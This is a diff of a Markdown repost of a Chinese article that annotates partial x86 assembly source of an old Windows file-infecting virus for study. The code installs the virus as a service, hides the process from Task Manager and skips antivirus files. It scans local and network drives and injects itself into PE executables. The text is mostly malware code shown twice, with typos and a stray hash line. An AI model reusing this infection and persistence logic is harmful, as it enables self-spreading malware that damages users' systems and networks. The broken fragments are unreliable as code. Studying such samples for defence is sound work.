@@ -1,675 +1,842 @@
 
-
 # 对一个病毒的源码分析
 
 > 原文：[`www.pediy.com/kssd/pediy09/pediy09-218.htm`](https://www.pediy.com/kssd/pediy09/pediy09-218.htm)
 
-> 本文就一个以前的病毒进行分析，代码不全，重点在与学习其中的汇编  
->   
-> VStart:  
->      call  GetDelta    ;此子程序用于获得病毒在内存中的开始地址，是绝大多数的病毒都要用到的技术，对于加解密软件有很大的帮助  
->      lea esi ,\[offset HostCode +ebx\]  
->      mov edi,\[esp\]  
->      sub edi,08  
->      mov  \[esp\] ,edi  
->      movsd  
->      movsd  
->   
->      push dword ptr  \[esp+04\]  
->      call RelocKernel32    ;重定位 kernell32  
->                    or eax,eax  
->                    jz short Exit  
->                    cmp byte ptr \[offset OS +ebx\],00  ;判断操作系统的类型  
->                    jnz short NT\_Srv  
->                    call Create9xProcess  ;建立 win9x 进程  
->                    ret  
->   
-> NT\_Srv:call CreateNTService;    建立 NT 服务  
-> Exit :ret  
->   
->   
-> :\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;建立 NT 服务的子程序  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> CreateNTservice:  
->                    call RelocAdvapi32  
->                    or  eax,eax  
->                    jz  short CNT\_Failed  
->   
->                    push 02  
->                    push 00  
->                    push 00     ;获取服务管理器句柄  
->   
->                    call openSCManagerA  
->   
->                    or eax,eax  
->                    jz short CNT\_Failed   
->                    mov SCM\_Handle,eax  
->                    call  CreateExecutable   ;建立文件  
->   
->   
->                    or eax,eax   ;已经驻留到内存退出  
->                    jz short CNT\_Exit  
->   
->                    mov edi,0F01FF  
->                    lea esi,offset\[Service+ebx\]  
->                    push edi  
->                    push esi  
->                    push SCM\_Handle  
->                    call OpenServiceA  
->   
->                    or eax,eax  
->   
->                    jnz short CNT\_Run  
->   
->                    xor eax,eax  
->                    push eax  
->                    push eax  
->                    push eax  
->                    push eax  
->                    push eax  
->                    lea eax,\[offset Buffer1+ebx\]      ;生成的 exe 文件  
->                    push eax  
->                    push 01  ;错误代码  
->                    push 02  ;开始  
->                    push 20  ;类型  
->                    push edi  
->                    push 00  
->                    push esi   
->                    push SCM\_Handle   ;句柄  
->                    call  CreateServiceA   ;建立服务  
->   
->                    or eax,eax  
->                    jz short CNT\_Failed   
-> CNT\_Run:  
->   
->                    push 00  
->                    push 00  
->                    push eax  
->                    call StartServiceA    ;开始服务  
->   
->                    or eax,eax  
->                    jnz short CNT\_Exit  
->   
-> CNT\_Failed:  
->                    call StartInfectionThread   ;传染子程序   
->   
-> CNT\_Exit:  
->     ret  
->   
->   
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;建立 9x 的进程子程序  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
->   
-> create9xProcess:     ;生成 FLCSS.EXE,够狠，让人杀不尽  
->                    call CreateExecuteable  
->                    or eax,eax  
->                    jz short P9x\_Exit  
->                    P9x\_00:  
->                    xor eax,eax  
->                    lea edi,\[offset Buffer+ebx\]  
->                    push edi  
->                    push edi  
->                    mov ecx,040  
->                    repz stosd  
->                    mov cl,06  
->                    push eax  
->                    loop $ - 1  
->   
->                    lea esi,\[offset Buffer1+edx\]  
->                    push esi  
->                    push 00  
->                    call CreateProcessA    ;创建进程  
->                    or eax,eax  
->                    jnz short P9x\_Exit  
->   
-> P9x\_Failed:  
->                    call StartInfectionThread;   传染子程序  
->   
-> P9x\_Exit:  
->                ret  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;因为生成 flcss.exe，很难杀干净，就是它的原因  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
->   
-> CreateExecutable:  
->                    lea edi,\[offset Buffer1+ebx\]  
->                    push edi  
->   
->                    push 104  
->                    push edi  
->                    call GetSystemDirectoryA                    ;取得系统的目录  
->                    add edi,eax  
->                    mov al,'\\'  
->                    stosb  
->                    lea esi,\[offset Process + ebx\]  
->                    movsd  
->                    movsd  
->                    movsd  
->   
->                    push 02  
->                    call OpenFile  
->                    cmp eax,-1  
->   
->                    jz short CE\_Exit  
->   
->                    mov c\_FileHandle,eax  
->                    lea edi,\[offset VImports+ebx\]   ;清除 import  
->                    mov eax,-1  
->                    stosd  
->                    stosd  
->                    lea edi,\[offset Kernel32\_Relocated + ebx\]     ;第二个 import  
->                    mov eax,\[edi - 8\]  
->                    stosd  
->   
->                    push 00  
->                    lea esi,c\_BytesWritten  
->                    push esi  
->                    push 0200  
->                    push ebx  
->                    push c\_FileHandle  
->                    call WriteFile    ;写文件头  
->   
->                    push 00  
->                    push esi  
->                    push 1000  
->                    push ebx  
->                    push c\_FileHandle  
->                    call WriteFile    ;写入病毒体  
->   
->                    push c\_FileHandle  
->                    call CloseHandle    ;关闭文件  
-> CE\_Exit:  
->              inc eax  
->                ret  
->   
->   
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;下面差不多应该是病毒的服务程序  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
->   
-> VService:  
->                    call GetDelta  
->                    push dword ptr \[esp\]  
->                    call RelocKernel32  
->                    or eax,eax  
->                    jz VS\_Exit  
->                    cmp byte ptr \[offset OS +ebx\],00   ;操作系统类型  
->                    jz short W9x\_Service\_Register       ;注册 9x 的服务  
->                    WNT\_Service\_hacknowledge:  
->                    call RelocAdvapi32       ;重新定位 Advapi32  
-> jz VS\_Exit  
->                    lea esi,\[offset Buffer1 + ebx\]  
->                    xor eax,eax  
->                    lea  ecx,\[offset Service + ebx\]  
->                    lea  edx,\[offset ServiceDispatcher + ebx\]  
->                    mov \[esi\],ecx  
->                    mov \[esi+04\],edx  
->                    mov \[esi+08\],eax  
->                    mov \[esi+0c\],eax       ;将控制权返回给调用者  
->                    push esi  
->                    call StartServiceCtrlDispatcherA  
->   
-> W9x\_Service\_Register:  
->                    lea esi,\[offset USER32\_Name + ebx\]  
->                    push esi  
->                    call LoadLibraryA  
->   
->                    lea esi,\[offset RegisterClassA + ebx\]  
-> push esi  
-> push eax  
-> call GetProcAddress      ;获取进程的地址  
->   
-> or eax,eax  
-> jz short VS\_00  
->   
-> mov \[esi -06\],eax  
->   
-> lea esi,\[offset Buffer1+ebx\]  
-> mov edi,esi  
-> xor eax,eax  
-> mov ecx,0A  
-> repz stosd  
-> mov dword ptr \[esi + 04\] ,-1  
-> mov dword ptr \[esi + 10\] ,400000    ;Win9x 的基址  
-> lea eax,\[offset Service+ebx\]  
-> mov \[esi + 24\],eax  
->   
-> push esi  
-> call  RegisterClassA      ;重要  
-> lea esi,\[offset RegisterServiceProcess+ ebx\]  
-> push esi  
-> push dword ptr \[offset Kernel32\_Base + ebx\]  
-> call GetProcAddress  
->   
-> or eax,eax  
-> jz short VS\_00  
-> mov \[esi - 06\] ,eax  
-> call GetCurrentProcessId   ;获取当前进程的 ID 注册为服务  
->   
-> call GetCurrentProcessID   ;注册为服务，可以防止用户在（ctrl + Alt + Del）任务管理器中发现  
-> push 01  
-> push eax  
-> call RegisterServiceProcess   
-> push 8000                      ;延时操作  
->   
-> call Sleep  
-> VS\_00:  
->           call StartInfectionThread  
->   
-> VS\_Exit:  
->            ret  
->   
->   
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;9x 的服务结束，下一步，应该是 NT 的服务  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
->   
-> ServiceDispatcher:  
-> call GetDelta  
-> lea edi,\[offset Service + ebx\]  
-> push esi  
-> push edi  
-> call RegisterServiceCtrlHandlerA  
->   
-> mov Service\_Handle,eax  
-> lea esi,\[offset Buffer + ebx\]  
-> mov edi,esi  
-> mov ecx,06  
-> xor eax,eax  
-> repz stosd  
->   
-> mov dword ptr \[esi\],10  
-> mov dword ptr \[esi+04\],04  
-> mov dword ptr \[esi+08\],07  
->   
-> push esi  
-> push Service\_Handle     ;告诉 windows 服务已经正确运行  
-> call SetServiceStatus  
-> push 8000      ;延时  
-> call Sleep   
->   
-> call StartInfectionThread ;建立进程  
-> ret  
-> ServiceHandler:  
-> ret                            ;当管理员关闭服务，提示系统出错  
->   
->   
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;次子程序用于建立线程  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
->   
-> StartInfectionThread:  
-> call GetTickCount  
-> mov \[offset Rand + ebx\] ,eax  
->   
-> lea eax,ThreadId  
-> push eax  
-> push 0  
-> push 0  
-> lea eax,\[offset VThread + ebx\]  
-> push eax  
-> push 0  
-> push 0  
-> call CreateThread  
-> ret  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;病毒线程  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> VThread:  
-> call GetDelta  
->   
-> call InfectDrives     ;感染本地文件（本地感染）  
->   
-> push 60000  
-> call Sleep  
->   
-> call GetRand  
-> and al,1F  
-> jnz short VThread  
-> call InfectNetwork    ;感染网络文件（网络传播）  
-> jmp short VThread  
->   
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;通过网络传染的子程序  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> InfectNetwork:  
-> lea eax,\[offset MPR\_Name + ebx\]  
-> push eax  
-> call LoadLibraryA  
->   
-> or eax,eax  
-> jz short INet\_Failed  
->   
-> push eax  
-> lea esi,\[offset MPR\_Function + ebx\]  
-> push eax  
-> call LoadLibraryA  
->   
-> or eax,eax  
-> jz short INet\_Failed  
->   
-> push eax  
-> lea esi,\[offset MPR\_Functions + ebx\]  
-> push esi  
-> call DLL\_Relocate  
->   
-> or eax,eax  
-> jz short INet\_Failed  
->   
-> push 00  
-> call NetSearch   
-> INet\_Failed:  
-> ret  
->   
->   
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;此处用来测试驱动器是否有效  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> InfectDrives:  
-> push esi  
-> call GetTickCount  
-> mov \[offset Tick+ebx\],eax  
->   
-> lea esi,\[offset Tick + ebx\],eax  
->   
-> lea esi,\[offset Buffer1 + ebx\]  
-> mov dword ptr \[esi\],'\\:+ebx - offset VStart'  
->   
-> ID\_TestDrive:  
->   
-> mov byte ptr \[esi + 03 \],00  
-> push esi  
-> call GetDriverTypeA     ;获得驱动器的类型  
->   
-> cmp al,03               ;硬盘？  
->   
-> jz short ID\_DriveOK  
->   
-> cmp al,04                ;网络驱动器？无盘工作？网吧一类的？  
->   
-> jnz short ID\_Invalid  
->   
-> ID\_DriveOK:  
->   
->                    add esi,03  
->   
->                    push esi  
->   
->                    call BlownAway  
->   
->                    push esi  
->   
->                    call FileSearch       ;查找文件  
->   
->                    sub esi,03  
->                      
-> ID\_Invalid:  
->   
->                    mov al,\[offset Buffer1 + ebx\]  
->                    inc al  
->                    mov \[offset Buffer1 + ebx\],al  
->   
->                    cmp al,'Z'  
->                    jna short ID\_TestDrive  
->   
->                    pop esi  
->                            ret  
->   
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;开始网络传染  
-> ;查找网络计算机  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
->   
-> NetSearch :  
->   
->                    mov EnumBufferSize,4000  
->                    or EnumNB\_Objects,-1  
->                    lea eax,WNetStructAddr  
->                    push eax  
->                    push WNetStructAddr  
->                    push 0  
->                    push 0  
->                    push 2  
->                    call WNetOpenEnumA  
->                    or eax,eax  
->                    jnz NET\_Close  
->   
->                    push 04  
->                    push 1000  
->                    push 4000  
->                    push 00  
->                    call VirtualAlloc  
->   
->                    or eax,eax  
->                    jz short NET\_Close  
->                    mov EnumBufferAddr,eax  
->   
-> Net\_00:  
->                    mov esi,EnumBufferAddr  
->   
->                    lea eax,EnumBufferSize  
->                    push eax  
->                    push esi  
->                    lea eax,EnumNB\_Objects  
->                    push eax  
->                    push WNetStructAddr  
->                    call WNetEnumResourceA  
->   
->                    or eax,eax  
->                    jnz short NET\_Free  
->                    mov ecx,EnumNB\_Objects  
->                    or ecx,ecx  
->                    jz short NET\_00  
-> NET\_01:  
->                    push ecx  
->                    push esi  
->                    mov esi,\[esi+14\]   ;计算机名  
->                    or esi,esi  
->                    jz short NET\_03  
->                    lea edi,\[offset Buffer1 + ebx\]  
-> NET\_02:  
->                    movsb  
->                    cmp byte ptr \[esi\],00  
->                    jnz short NET\_02  
->                    mov al,'\\'  
->                    stosb  
->                    push edi  
->                    call BlowAway  
->   
->                    push edi  
->                    call FileSearch  
-> Net\_03:  
->                    pop esi  
->                    mov eax,\[esi + 0C\]  
->                    and al,2  
->                    cmp al,2  
->                    jnz short NET\_04  
->   
->                    push esi  
->                    call NetSearch  
->   
-> NEt\_04:  
->                    add esi,20  
->                    pop ecx  
->                    loop NET\_01  
->                    jmp short NET\_00  
->                      
-> NET\_Free:  
->                 push 8000  
->                    push 00  
->                    push EnumBufferAddr  
->                    call VirtualFree  
->   
-> NET\_Close:  
->                    push WNetStructAddr  
->                    call WNetCloseEnum  
->                    ret  
->   
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
->   
-> FileTest:  
->     mov edx,\[edi+2C\]  
->     or edx,20202020  
->     xor edx,61F81F61  
->   
->     lea esi,\[offset skipNames + ebx\] ;跳过一些反病毒软件的感染  
->     mov ecx,0C  
->   
-> FT\_00:  
->     lodsd  
->     cmp edx,eax  
->     jz short FT\_Exit  
->     loop FT\_00  
->   
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;注意  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
->     mov esi,edi  
->     add esi,2C  
->   
-> FT\_01:  
->     lodsb  
->     or al,al  
->     jnz short FT\_01  
->     mov eax,\[esi -4\]    ;扩展名判断  
->     or eax,20202020  
->     cmp eax,'xco' ;控件 4  
->     jz short FT\_02  
->   
->     cmp eax,'rcs'   ;屏幕保护文件  
->     jz short FT\_01  
->   
->     cmp eax,'exe' ;标准 exe 文件  
->     jnz short FT\_Exit  
->   
-> FT\_02:  
->     mov eax,\[edi+20\]  ;文件小于 2000 的就不感染  
->     cmp eax,2000  
->     jc short FT\_Exit  
->   
->     cmp al,03   ;检测是否已经感染  
->     jz short FT\_Exit  
->   
->     lea esi,\[offset Buffer1 + ebx\]  ;取文件名和路径  
->     lea edi,\[offset Buffer3 + ebx\]  
->     push edi  
->     mov ecx,CurrentDirEnd  
->     sub ecx,esi  
->     repz movsb  
->     lea sei,\[offset Buffer2 + ebx\]  
->     add esi,2C  
->   
-> FT\_03:  
->     movsb  
->     cmp byte ptr \[esi - 1\],0  
->     jnz short FT\_03  
->   
->     call InfectFile  
->   
-> Ft\_Exit:  
->     jmp RS\_Next  
->   
->   
->   
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;感染文件子程序  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> InfectFile:  
->     push i\_Filename  
->     push 03   ;打开文件  
->     call OpenFile  
->   
->     cmp eax,-1  
->     jz IN\_Exit  
->   
->     mov i\_FileHandle,eax  
->   
->     push 00  
->     push eax  
->     call GetFileSize   ;去文件的大小，用于以后还原  
->   
->     mov i\_FileSize,eax  
->   
->     cmp al,03  ;是否感染  
->     jz IN\_Exit  
->   
->     lea edi,\[offset Buffer3 +ebx\]  
->   
->     push 00  
->     lea esi,i\_BytesRead  
->     push esi  
->     push 2000  
->     push edi  
->     push i\_FileHandle  
->     call ReadFile  
->   
->   
->   
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
-> ;以下程序与文件头有关  
-> ;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
->   
-> cmp word ptr \[edi\],5A4Dh    ;dos 文件头  
-> jnz IN\_CloseFile            ;确保是感染的是 PE 文件  
-> cmp word ptr \[edi + 18\],0040  ;是否是 windows 文件  ，此处>=40 为 windows 文件，<40H,则是 dos 文件  
->   
->     jnz IN\_CloseFile  
->   
->     cmp dword ptr \[edi + 3C\],1C00  
->     ja IN\_CloseFile  
->     cmp dword ptr \[edi + 3C\] ,1C00  ;dos 文件头的大小  
->     ja IN\_CloseFile  
->   
->     add edi \[edi + 3C\]   ;指向 PE 或者 NE 文件头  
->   
->     mov eax,\[edi\]  
->     cmp eax,00004550      ;  
->     jnz IN\_CloseFile      ;win3.x 的 18H 值也大于等于 40H，可是有用 3.x 的？和病毒出生的年代有关系吧:)  
->   
->     cmp word ptr \[edi+5C\],2     ;GUI???  
->     jnz IN\_CloseFile  
->   
->     mov esi,edi  
->     add esi,18  
->     add si,\[edi+14\]        ;将 esi 指向第一个节表  
->     push esi  
->   
->     mov eax,\[edi+28\]  
->   
-> IN\_00:  
->     mov ecx,\[esi+0C\]  
->     add ecx,\[esi+08\]  
->   
->     cmp eax,ecx  
->     jc short IN\_01  
->     add esi,28  
->     cmp eax,ecx  
->     jc short IN\_01  
->     add esi,28  
->     jmp short IN\_00  
->   
-> IN\_01:  
->     sub eax,\[esi+0C\]  
->     add eax,\[esi+14\]  
->     mov i\_EP\_Offset,eax  
->   
->     or \[esi+24\],80000000       ;将它改为可写，这个是 windows 与 dos 在程序和数据段上的一个改变，使我 windows 病毒要注意的地方  
->     pop esi  
->     xor ecx,ecx  
->     mov cx,\[edi+06\]  
->     dec ecx  
->     mov eax,ecx  
->     mov edx,28  
->     mul edx  
->     add esi,eax   ;ESI 指向最后一个节表  
->   
->     mov eax,\[esi+24\]  
->     cmp al,80  ;是否已经初始化  
->     jz IN\_CloseFile  
->     or eax,8C000000 
+> 本文就一个以前的病毒进行分析，代码不全，重点在与学习其中的汇编
 
- 4dd466d0e1e0cc123afbe504da2462ca
+> VStart:
+> 
+> call GetDelta ;此子程序用于获得病毒在内存中的开始地址，是绝大多数的病毒都要用到的技术，对于加解密软件有很大的帮助
+> lea esi ,[offset HostCode +ebx]
+> mov edi,[esp]
+> sub edi,08
+> mov [esp] ,edi
+> movsd
+> movsd
+> 
+> push dword ptr [esp+04]
+> call RelocKernel32 ;重定位 kernell32
+> or eax,eax
+> jz short Exit
+> cmp byte ptr [offset OS +ebx],00 ;判断操作系统的类型
+> jnz short NT_Srv
+> call Create9xProcess ;建立 win9x 进程
+> ret
+> 
+> NT_Srv:call CreateNTService; 建立 NT 服务
+> Exit :ret
+
+> :********************************************************************
+> ;建立 NT 服务的子程序
+> ;********************************************************************
+> CreateNTservice:
+> call RelocAdvapi32
+> or eax,eax
+> jz short CNT_Failed
+> 
+> push 02
+> push 00
+> push 00 ;获取服务管理器句柄
+> 
+> call openSCManagerA
+> 
+> or eax,eax
+> jz short CNT_Failed 
+> mov SCM_Handle,eax
+> call CreateExecutable ;建立文件
+> 
+> 
+> or eax,eax ;已经驻留到内存退出
+> jz short CNT_Exit
+> 
+> mov edi,0F01FF
+> lea esi,offset[Service+ebx]
+> push edi
+> push esi
+> push SCM_Handle
+> call OpenServiceA
+> 
+> or eax,eax
+> 
+> jnz short CNT_Run
+> 
+> xor eax,eax
+> push eax
+> push eax
+> push eax
+> push eax
+> push eax
+> lea eax,[offset Buffer1+ebx] ;生成的 exe 文件
+> push eax
+> push 01 ;错误代码
+> push 02 ;开始
+> push 20 ;类型
+> push edi
+> push 00
+> push esi 
+> push SCM_Handle ;句柄
+> call CreateServiceA ;建立服务
+> 
+> or eax,eax
+> jz short CNT_Failed 
+> CNT_Run:
+> 
+> push 00
+> push 00
+> push eax
+> call StartServiceA ;开始服务
+> 
+> or eax,eax
+> jnz short CNT_Exit
+> 
+> CNT_Failed:
+> call StartInfectionThread ;传染子程序 
+> 
+> CNT_Exit:
+> ret
+
+> :********************************************************************
+> ;建立 9x 的进程子程序
+> ;********************************************************************
+> 
+> create9xProcess: ;生成 FLCSS.EXE,够狠，让人杀不尽
+> call CreateExecuteable
+> or eax,eax
+> jz short P9x_Exit
+> P9x_00:
+> xor eax,eax
+> lea edi,[offset Buffer+ebx]
+> push edi
+> push edi
+> mov ecx,040
+> repz stosd
+> mov cl,06
+> push eax
+> loop $ - 1
+> 
+> lea esi,[offset Buffer1+edx]
+> push esi
+> push 00
+> call CreateProcessA ;创建进程
+> or eax,eax
+> jnz short P9x_Exit
+> 
+> P9x_Failed:
+> call StartInfectionThread; 传染子程序
+> 
+> P9x_Exit:
+> ret
+
+> :********************************************************************
+> ;因为生成 flcss.exe，很难杀干净，就是它的原因
+> ;********************************************************************
+> 
+> CreateExecutable:
+> lea edi,[offset Buffer1+ebx]
+> push edi
+> 
+> push 104
+> push edi
+> call GetSystemDirectoryA ;取得系统的目录
+> add edi,eax
+> mov al,'\ '
+> stosb
+> lea esi,[offset Process + ebx]
+> movsd
+> movsd
+> movsd
+> 
+> push 02
+> call OpenFile
+> cmp eax,-1
+> 
+> jz short CE_Exit
+> 
+> mov c_FileHandle,eax
+> lea edi,[offset VImports+ebx] ;清除 import
+> mov eax,-1
+> stosd
+> stosd
+> lea edi,[offset Kernel32_Relocated + ebx] ;第二个 import
+> mov eax,[edi - 8]
+> stosd
+> 
+> push 00
+> lea esi,c_BytesWritten
+> push esi
+> push 0200
+> push ebx
+> push c_FileHandle
+> call WriteFile ;写文件头
+> 
+> push 00
+> push esi
+> push 1000
+> push ebx
+> push c_FileHandle
+> call WriteFile ;写入病毒体
+> 
+> push c_FileHandle
+> call CloseHandle ;关闭文件
+> CE_Exit:
+> inc eax
+> ret
+
+> :********************************************************************
+> ;下面差不多应该是病毒的服务程序
+> :********************************************************************
+> 
+> VService:
+> call GetDelta
+> push dword ptr [esp]
+> call RelocKernel32
+> or eax,eax
+> jz VS_Exit
+> cmp byte ptr [offset OS +ebx],00 ;操作系统类型
+> jz short W9x_Service_Register ;注册 9x 的服务
+> WNT_Service_hacknowledge:
+> call RelocAdvapi32 ;重新定位 Advapi32
+> jz VS_Exit
+> lea esi,[offset Buffer1 + ebx]
+> xor eax,eax
+> lea ecx,[offset Service + ebx]
+> lea edx,[offset ServiceDispatcher + ebx]
+> mov [esi],ecx
+> mov [esi+04],edx
+> mov [esi+08],eax
+> mov [esi+0c],eax ;将控制权返回给调用者
+> push esi
+> call StartServiceCtrlDispatcherA
+> 
+> W9x_Service_Register:
+> lea esi,[offset USER32_Name + ebx]
+> push esi
+> call LoadLibraryA
+> 
+> lea esi,[offset RegisterClassA + ebx]
+> push esi
+> push eax
+> call GetProcAddress ;获取进程的地址
+> 
+> or eax,eax
+> jz short VS_00
+> 
+> mov [esi -06],eax
+> 
+> lea esi,[offset Buffer1+ebx]
+> mov edi,esi
+> xor eax,eax
+> mov ecx,0A
+> repz stosd
+> mov dword ptr [esi + 04] ,-1
+
+
+
+```
+mov dword ptr [esi + 10] ,400000    ;Win9x 的基址  
+
+lea eax,[offset Service+ebx]  
+
+mov [esi + 24],eax   
+
+push esi  
+
+call  RegisterClassA      ;重要  
+
+lea esi,[offset RegisterServiceProcess+ ebx]  
+
+push esi  
+
+push dword ptr [offset Kernel32_Base + ebx]  
+
+call GetProcAddress   
+
+or eax,eax  
+
+jz short VS_00  
+
+mov [esi - 06] ,eax  
+
+call GetCurrentProcessId   ;获取当前进程的 ID 注册为服务   
+
+call GetCurrentProcessID   ;注册为服务，可以防止用户在（ctrl + Alt + Del）任务管理器中发现  
+
+push 01  
+
+push eax  
+
+call RegisterServiceProcess   
+
+push 8000                 ;延时操作   
+
+call Sleep  
+
+VS_00:  
+
+          call StartInfectionThread   
+
+VS_Exit:  
+
+         ret   
+
+;*************************  
+
+;9x 的服务结束，下一步，应该是 NT 的服务  
+
+;*************************  
+
+ServiceDispatcher:  
+
+call GetDelta  
+
+lea edi,[offset Service + ebx]  
+
+push esi  
+
+push edi  
+
+call RegisterServiceCtrlHandlerA   
+
+mov Service_Handle,eax  
+
+lea esi,[offset Buffer + ebx]  
+
+mov edi,esi  
+
+mov ecx,06  
+
+xor eax,eax  
+
+repz stosd   
+
+mov dword ptr [esi],10  
+
+mov dword ptr [esi+04],04  
+
+mov dword ptr [esi+08],07   
+
+push esi  
+
+push Service_Handle     ;告诉 windows 服务已经正确运行  
+
+call SetServiceStatus  
+
+push 8000      ;延时  
+
+call Sleep   
+
+call StartInfectionThread ;建立进程  
+
+ret  
+
+ServiceHandler:  
+
+ret                      ;当管理员关闭服务，提示系统出错   
+
+;************************************************************  
+
+;次子程序用于建立线程  
+
+;************************************************************  
+
+StartInfectionThread:  
+
+call GetTickCount  
+
+mov [offset Rand + ebx] ,eax   
+
+lea eax,ThreadId  
+
+push eax  
+
+push 0  
+
+push 0  
+
+lea eax,[offset VThread + ebx]  
+
+push eax  
+
+push 0  
+
+push 0  
+
+call CreateThread  
+
+ret  
+
+;****************************  
+
+;病毒线程  
+
+;****************************  
+
+VThread:  
+
+call GetDelta   
+
+call InfectDrives     ;感染本地文件（本地感染）   
+
+push 60000  
+
+call Sleep   
+
+call GetRand  
+
+and al,1F  
+
+jnz short VThread  
+
+call InfectNetwork    ;感染网络文件（网络传播）  
+
+jmp short VThread   
+
+;************************************************************  
+
+;通过网络传染的子程序  
+
+;************************************************************  
+
+InfectNetwork:  
+
+lea eax,[offset MPR_Name + ebx]  
+
+push eax  
+
+call LoadLibraryA   
+
+or eax,eax  
+
+jz short INet_Failed   
+
+push eax  
+
+lea esi,[offset MPR_Function + ebx]  
+
+push eax  
+
+call LoadLibraryA   
+
+or eax,eax  
+
+jz short INet_Failed   
+
+push eax  
+
+lea esi,[offset MPR_Functions + ebx]  
+
+push esi  
+
+call DLL_Relocate   
+
+or eax,eax  
+
+jz short INet_Failed   
+
+push 00  
+
+call NetSearch   
+
+INet_Failed:  
+
+ret   
+
+;************************************************************  
+
+;此处用来测试驱动器是否有效  
+
+;************************************************************  
+
+InfectDrives:  
+
+push esi  
+
+call GetTickCount  
+
+mov [offset Tick+ebx],eax   
+
+lea esi,[offset Tick + ebx],eax   
+
+lea esi,[offset Buffer1 + ebx]  
+
+mov dword ptr [esi],'\\:+ebx - offset VStart'   
+
+ID_TestDrive:   
+
+mov byte ptr [esi + 03 ],00  
+
+push esi  
+
+call GetDriverTypeA     ;获得驱动器的类型   
+
+cmp al,03               ;硬盘？   
+
+jz short ID_DriveOK   
+
+cmp al,04               ;网络驱动器？无盘工作？网吧一类的？   
+
+jnz short ID_Invalid   
+
+ID_DriveOK:   
+
+                add esi,03   
+
+                push esi   
+
+                call BlownAway   
+
+                push esi   
+
+                call FileSearch       ;查找文件   
+
+                sub esi,03   
+
+ID_Invalid:   
+
+                mov al,[offset Buffer1 + ebx]  
+
+                inc al  
+
+                mov [offset Buffer1 + ebx],al   
+
+                cmp al,'Z'  
+
+                jna short ID_TestDrive   
+
+                pop esi  
+
+                        ret   
+
+;**********************************************************************  
+
+;开始网络传染  
+
+;查找网络计算机  
+
+;**********************************************************************  
+
+NetSearch :   
+
+                mov EnumBufferSize,4000  
+
+                or EnumNB_Objects,-1  
+
+                lea eax,WNetStructAddr  
+
+                push eax  
+
+                push WNetStructAddr  
+
+                push 0  
+
+                push 0  
+
+                push 2  
+
